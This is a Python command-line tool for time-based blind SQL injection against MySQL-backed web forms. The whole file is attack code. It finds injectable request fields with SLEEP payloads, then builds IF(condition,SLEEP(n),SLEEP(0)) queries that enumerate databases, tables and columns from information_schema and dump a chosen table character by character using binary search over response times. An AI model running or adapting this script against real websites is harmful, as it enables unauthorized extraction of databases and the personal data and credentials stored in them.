# time-based-sql-injection

import sys, argparse, ast, requests, threading, time, datetime

from requests.sessions import default_headers

M_GET = 'GET'
M_POST = 'POST'

EVALUATING_ROUNDS = 10
threads_num = 1

SQL_SUFFIX_TYPE = ['', '-- -', 'AND \'1\'=\'1']
NO_SUFF = 0
COMMENT_SUFF = 1
AND_SUFF = 2

QUERY_TYPE_COUNT = 0
QUERY_TYPE_LENGTH = 1
QUERY_TYPE_VALUE = 2

# MySQL DB Tables #
INFORMATION_SCHEMA_DB_NAME = 'information_schema' 

INF_SCHEMA_SCHEMATA = 'SCHEMATA' 
INF_SCHEMA_SCHEMATA_SCHEMA_NAME = 'SCHEMA_NAME' 

INF_SCHEMA_TABLES = 'TABLES' 

# used in where clause
INF_SCHEMA_TABLES_TABLE_SCHEMA = 'TABLE_SCHEMA' 
INF_SCHEMA_TABLES_TABLE_NAME = 'TABLE_NAME' 

INF_SCHEMA_COLUMNS = 'COLUMNS' 
INF_SCHEMA_COLUMNS_TABLE_NAME = 'TABLE_NAME' 
INF_SCHEMA_COLUMNS_TABLE_SCHEMA = 'TABLE_SCHEMA' 
INF_SCHEMA_COLUMNS_COLUMN_NAME = 'COLUMN_NAME' 

def string_to_int_list(s):
    lst = []
    for c in s:
        lst.append(str(ord(c)))
    return ','.join(lst)

def build_where_predicate(where_params, where_values, where_conjunction, quote):
    if quote != '':
        return ''.join(['{}{}{}{}{} {} '.format(p, '=', quote, v, quote, where_conjunction) for (p,v) in zip(where_params, where_values)])[:-(2+len(where_conjunction))]
    else:
        return ''.join(['{}{}{}{}{} {} '.format(p, '=', 'CHAR(', string_to_int_list(v), ')', where_conjunction) for (p,v) in zip(where_params, where_values)])[:-(2+len(where_conjunction))]
	
def find_table_rows_count(url, method, headers, cookies, data, vuln_field,
            vuln_type, db_name, table_name, sleep_time, where_params = '', where_values = '', where_conjunction = ''):
    m_data = data.copy()
    file = ''
    m_table_name = '%s.%s' % (db_name, table_name)
    query = build_query(QUERY_TYPE_COUNT, vuln_type, m_table_name, where_params, where_values, where_conjunction)

    if verbose:
        print('\nDeterminating number of rows of table: %s\n' % table_name)

    found = False
    count = 0
    while not found:
        m_data[vuln_field] = data[vuln_field] + build_sql_injection(query, '=', str(count), sleep_time, vuln_type)
        if verbose:
            print('{{{}: {}}}'.format(vuln_field, m_data[vuln_field]))
        if log:
            file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
        elapsed = measure_request_time(url, method, headers, cookies, m_data)
        if elapsed >= sleep_time:
            found = True
        else:
            count += 1

    if verbose:
        print('\n{}: {} rows\n'.format(table_name, str(count)))

    if log:
        file.write('\n{}: {} rows\n\n'.format(table_name, str(count)))
        file.close()

    return count

def print_user_choice_table(values, title = ''):
    
    if len(values) == 0:
        print('Empty value')
        raise Exception
    if len(values) == 1:
        print('Only one value')
        print('Choice: %s' % values[0])
        return 0
    if title:
        print(title)

    for i in range(len(values)):
        print(str(i+1) + ' - ' + values[i])
    print('\n')

    choice = -1
    while choice < 0 or choice >= (len(values)):
        print('\033[A                             \033[A')
        try:
            choice = int(input('Choice[1 - ' + str(len(values)) + ']:')) - 1
        except Exception as e:
            choice = -1
            pass

    return choice


def avg_time(times):
    if len(times) == 1:
        return times[0]
    max_index = -1
    max_time = 0
    for i in range(len(times)):
        if times[i] > max_time:
            max_time = times[i]
            max_index = i
    times.pop(max_index)

    if len(times) > 1:
        max_index = -1
        max_time = 0
        for i in range(len(times)):
            if times[i] > max_time:
                max_time = times[i]
                max_index = i
    times.pop(max_index)

    return sum(times)/len(times)

def evaluate_response_time(url, method, headers, cookies, data):
    times = []
    for i in range(EVALUATING_ROUNDS):
        times.append(measure_request_time(url, method, headers, cookies, data))
    return avg_time(times)

def evaluate_sleep_time(response_time):
	if response_time < 0.1:
		return response_time * 10
	elif response_time >= 0.1 and response_time < 1:
		return response_time * 5
	elif response_time >= 1 and response_time < 5:
		return response_time
	elif response_time >= 5:
		return response_time * 0.5

def measure_request_time_no_threads(url, method, headers, cookies, data):
    if method == M_GET:
        r = requests.get(url, headers = headers, cookies = cookies, params = data.items())
        return r.elapsed.total_seconds()
    elif method == M_POST:
        r = requests.post(url, headers = headers, cookies = cookies, data = data.items())
        return r.elapsed.total_seconds()
    else:
        return -1
class myRequestThread(threading.Thread):
    def __init__(self, threadID, name, url, method, headers, cookies, data, times):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.url = url
        self.method = method
        self.headers = headers
        self.cookies = cookies
        self.data = data
        self.times = times
    def run(self):
        self.times.append(measure_request_time_no_threads(self.url, self.method, self.headers, self.cookies, self.data))

def measure_request_time(url, method, headers, cookies, data):
    if threads_num <= 1:
        return measure_request_time_no_threads(url, method, headers, cookies, data)
    else:
        times = []
        threads = []
        for i in range(threads_num):
            t = myRequestThread(i, 'T-'+str(i), url, method, headers, cookies, data, times)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        print(times)
        return avg_time(times)

def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
    vuln_fields ={}
    sql = '{} AND SLEEP({}) {}'
    m_data = data.copy()
    elapsed_time = -1
    for field in m_data:
        m_data[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[COMMENT_SUFF])
        elapsed_time = measure_request_time(url, method, headers, cookies, m_data)

    if elapsed_time >= sleep_time:
        vuln_fields.update({field:COMMENT_SUFF})
    for field in vuln_fields:
        m_data.pop(field)

    if len(m_data) == 0:
        return vuln_fields

    for field in m_data:
        m_data[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[AND_SUFF])
        elapsed_time = measure_request_time(url, method, headers, cookies, m_data)
    if elapsed_time >= sleep_time:
        vuln_fields.update({field:AND_SUFF})
    for field in vuln_fields:
        m_data.pop(field)

    if len(m_data) == 0:
        return vuln_fields

    for field in m_data:
        m_data[field] = data[field] + sql.format('', sleep_time, SQL_SUFFIX_TYPE[NO_SUFF])
        elapsed_time = measure_request_time(url, method, headers, cookies, m_data)
    if elapsed_time >= sleep_time:
        vuln_fields.update({field:NO_SUFF})

    for field in vuln_fields:
        m_data.pop(field)

    return vuln_fields


def build_query(query_type, vuln_type, table_name, where_params = '', where_values = '', where_conjunction = '', row_limit = ''):
    where = ''
    if where_params and where_values:
        if vuln_type == NO_SUFF:
            where = ' WHERE {}'.format(build_where_predicate(where_params, where_values, where_conjunction, ''))
        elif vuln_type == COMMENT_SUFF or vuln_type == AND_SUFF:
            where = ' WHERE {}'.format(build_where_predicate(where_params, where_values, where_conjunction, '\''))

    query = ''
    if query_type == QUERY_TYPE_COUNT:
        query = 'SELECT COUNT(*) FROM %s'
    elif query_type == QUERY_TYPE_LENGTH:
        query = 'SELECT LENGTH({}) FROM %s'
    elif query_type == QUERY_TYPE_VALUE:
        query = 'SELECT ORD(MID({},{},1)) FROM %s '

    query += where
    if row_limit != '':
        query += ' LIMIT %i,1' % row_limit

    return query % table_name
    
def build_sql_injection(query, operand, value, sleep_time, vuln_type):
    if vuln_type == NO_SUFF:
        return ' AND IF(({}){}{},SLEEP({}),SLEEP(0))'.format(query, operand, value, str(sleep_time))
    elif vuln_type == COMMENT_SUFF:
        return '{} AND IF(({}){}{},SLEEP({}),SLEEP(0)) {}'.format('\'', query, operand, value, str(sleep_time), SQL_SUFFIX_TYPE[COMMENT_SUFF])
    elif vuln_type == AND_SUFF:
        return '{} AND IF(({}){}{},SLEEP({}),SLEEP(0)) {}'.format('\'', query, operand, value, str(sleep_time), SQL_SUFFIX_TYPE[AND_SUFF])

def find_data_val_binary(url, method, headers, cookies, data, vuln_field,
            vuln_type, db_name, table_name, column_name, db_field_length,
            sleep_time, row_limit = '', where_params = '', where_values = '', where_conjunction = ''):
    m_data = data.copy()
    file = ''
    data_val = []
    m_table_name = '%s.%s' % (db_name, table_name)
    query = build_query(QUERY_TYPE_VALUE, vuln_type, m_table_name, where_params, where_values, where_conjunction, row_limit)

    if verbose:
        print('\nDeterminating values of field: %s\n' % column_name)
   
    for i in range(1, db_field_length + 1):
        found = False
        low, high = 1, 128
        while not found:
            current = (low + high)//2
            m_data[vuln_field] = data[vuln_field] + build_sql_injection(query.format(column_name, str(i)), '=', current, sleep_time, vuln_type)
            if verbose:
                print('{{{}: {}}}'.format(vuln_field, m_data[vuln_field]))
            if log:
                file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
            elapsed = measure_request_time(url, method, headers, cookies, m_data)

            if elapsed >= sleep_time:
                data_val.append(chr(current))
                found = True
                if verbose:
                    print('\nFound character: %c\n\n' % chr(current))
            else:
                m_data[vuln_field] = data[vuln_field] + build_sql_injection(query.format(column_name, str(i)), '>', current, sleep_time, vuln_type)
                if verbose:
                    print('{{{}: {}}}'.format(vuln_field, m_data[vuln_field]))
                if log:
                    file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
                elapsed = measure_request_time(url, method, headers, cookies, m_data)
                if elapsed >= sleep_time:
                    low = current
                else:
                    high = current

    if verbose:
        print
    result = ''.join(data_val)
    if log:
        file.write('\nValue: %s\n\n\n' % result)
        file.close()

    return result

def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
                            db_name, table_name, column_name, sleep_time, row_limit = '',
                                where_params = '', where_values = '', where_conjunction = ''):
    m_data = data.copy()
    file = ''
    m_table_name = '%s.%s' % (db_name, table_name)

    query = build_query(QUERY_TYPE_LENGTH, vuln_type, m_table_name, where_params, where_values, where_conjunction, row_limit)
    if verbose:
        print('\nDeterminating number of characters in the field: %s\n\n' % column_name)


    found = False
    length = 0
    while not found:
        length += 1
        m_data[vuln_field] = data[vuln_field] + build_sql_injection(query.format(column_name), '=', str(length), sleep_time, vuln_type)
        if verbose:
            print('{{{}: {}}}'.format(vuln_field, m_data[vuln_field]))
        if log:
            file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
        elapsed = measure_request_time(url, method, headers, cookies, m_data)
        if elapsed == -1:
            return -1
        if elapsed >= sleep_time:
            found = True
        if length > 255:
            return -1

    if verbose:
        print('\nField length: %i\n' % length)
    if log:
        file.write('\nField length: %i\n\n' % length)
        file.close()

    return length

def list_to_dict(fields, values):
    if len(fields) != len(values):
        return 0
    result = {}
    for (f, v) in zip(fields, values):
        result[f] = v
    return result

def find_data(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, sleep_time, row_limit = '', where_params = '', where_values = '', where_conjunction = ''):
    length = find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, sleep_time, row_limit, where_params, where_values, where_conjunction)
    result = find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, length, sleep_time, row_limit , where_params, where_values, where_conjunction)
    return result

def main(argv):
    global M_GET, M_POST, threads_num, verbose, log, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, INF_SCHEMA_SCHEMATA_SCHEMA_NAME, INF_SCHEMA_TABLES, INF_SCHEMA_TABLES_TABLE_SCHEMA, INF_SCHEMA_TABLES_TABLE_NAME, INF_SCHEMA_COLUMNS, INF_SCHEMA_COLUMNS_TABLE_NAME, INF_SCHEMA_COLUMNS_COLUMN_NAME

    parser = argparse.ArgumentParser(description = 'Tool used to perform time based blind sql injection')
    parser.add_argument('-u', '--url', help = 'The URL on which try the attack.')
    parser.add_argument('-d', '--data', help = 'Payload for data fields. {\'<field>\': \'<value>\',...}', default = '{}')
    parser.add_argument('-m', '--method', help = 'The method <GET|POST>.', metavar = '<GET|POST>', default = M_GET, choices = [M_GET, M_POST])
    parser.add_argument('-s', '--sleep', type = int, help = 'The sleep time to use')
    parser.add_argument('-t', '--threads', type = int, help = 'Number of threads used for evaluating response time', default = 1)
    parser.add_argument('-v', '--verbose', help = 'Set verbose mode', action = 'store_true')
    parser.add_argument('-l', '--log', help = 'Set log mode', action = 'store_true')
    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()

    databases = [] # List of found databases
    tables = [] # List of tables in the selected database
    columns = [] # List of columns in the selected table
    results = [] # The data dump of the selected table
    db_name = '' # Selected database name
    table_name = '' # Selected table name

    url = args.url
    method = args.method
    data = ast.literal_eval(args.data)
    sleep_time = args.sleep
    threads_num = args.threads

    verbose = args.verbose
    log = args.log

    # print("data:", type(data))

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Connection': 'keep-alive'
    }
    cookies = {}

    print('\nStarting attack on URL: %s\n' % url)

    if not sleep_time:
        print('Evaluating response time...')
        avg_resp_time = evaluate_response_time(url, method, headers, cookies, data)
        sleep_time = evaluate_sleep_time(avg_resp_time)

    print('Looking for vulnerable fields...\n')
    vuln = find_vuln_fields(url, method, headers, cookies, data, sleep_time)
    vuln_fields = vuln.keys()
    vuln_fields = list(vuln_fields)

    print(vuln_fields)

    f = print_user_choice_table(vuln_fields, 'Vulnerable fields')
    sel_vuln_field = vuln_fields[f]
    sel_vuln_type = vuln[sel_vuln_field]

    print('\nLooking for database names, please wait...')

    rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, sleep_time)
    for i in range(rows_count):
        databases.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, INF_SCHEMA_SCHEMATA_SCHEMA_NAME, sleep_time, i))
        print('Found: %s' % databases[i])
        
    print("\n")
    elapsed = time.time() - start_time
    times_datbases = str(datetime.timedelta(seconds=elapsed)).split(".")
    times_datbases = times_datbases[0]
    print('elapsed time: %s' % times_datbases)
    print('\n')

    choice = print_user_choice_table(databases, 'Databases found:')
    db_name = databases[choice]
    print('\nDatabase selected: %s\n' % db_name)

    print('Looking for tables in %s, please wait...\n' % db_name)
    where_params = [INF_SCHEMA_TABLES_TABLE_SCHEMA]
    where_values = [db_name]

    rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, sleep_time, where_params, where_values)
    for i in range(rows_count):
        tables.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, INF_SCHEMA_TABLES_TABLE_NAME, sleep_time, i, where_params, where_values))
    

    choice = print_user_choice_table(tables, 'Tables found:')
    table_name = tables[choice]
    print('\nTable selected: %s\n' % table_name)

    print("\n")
    elapsed = time.time() - start_time
    times_tables = str(datetime.timedelta(seconds=elapsed)).split(".")
    times_tables = times_tables[0]
    print('elapsed time: %s' % times_tables)
    print('\n')
    
    print('Looking for columns in %s, please wait...\n' % table_name)
    where_params = [INF_SCHEMA_COLUMNS_TABLE_NAME, INF_SCHEMA_COLUMNS_TABLE_SCHEMA]
    where_values = [table_name, db_name]
    where_conjunction = 'AND'
    rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_COLUMNS, sleep_time, where_params, where_values, where_conjunction)
    for i in range(rows_count):
        columns.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_COLUMNS, INF_SCHEMA_COLUMNS_COLUMN_NAME, sleep_time, i, where_params, where_values, where_conjunction))

    print(columns)
    
    print("\n")
    elapsed = time.time() - start_time
    times_columns = str(datetime.timedelta(seconds=elapsed)).split(".")
    times_columns = times_columns[0]
    print('elapsed time: %s' % times_columns)
    print('\n')

    print('\nLooking for %s data, please wait...\n' % table_name)
    rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, db_name, table_name, sleep_time)
    for i in range (rows_count):
        d = []
        for col in columns:
            d.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, db_name, table_name, col, sleep_time, i))
        print(d)
        results.append(list_to_dict(columns, d))

    if len(results) == 0:
        print('No data in the table: %s' % table_name)
        sys.exit(0)

    print
    print('Result of dump of ' + table_name + ':')
    for row in results:
        print(row)

    print("\n")
    elapsed = time.time() - start_time
    times_data = str(datetime.timedelta(seconds=elapsed)).split(".")
    times_data = times_data[0]
    print('elapsed time: %s' % times_data)
    print('\n')


if __name__ == "__main__":
    start_time = time.time()
    main(sys.argv[1:])
    elapsed = time.time() - start_time
    times_total = str(datetime.timedelta(seconds=elapsed)).split(".")
    times_total = times_total[0]
    print("Total elapsed time: %s" % times_total)